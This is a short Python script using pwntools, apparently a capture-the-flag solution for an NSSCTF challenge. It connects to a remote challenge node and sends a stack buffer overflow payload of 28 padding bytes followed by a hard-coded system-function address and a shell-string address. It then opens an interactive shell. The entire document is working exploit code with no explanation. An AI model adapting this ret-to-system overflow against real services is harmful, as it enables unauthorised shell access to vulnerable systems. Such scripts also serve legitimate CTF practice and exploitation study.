from pwn import *

p=remote('node5.anna.nssctf.cn',26252)

sys_addr=0x8048529
sh_addr=0x08048670
payload=b'a'*(24+4)+p32(sys_addr)+p32(sh_addr)

p.sendline(payload)
p.interactive()

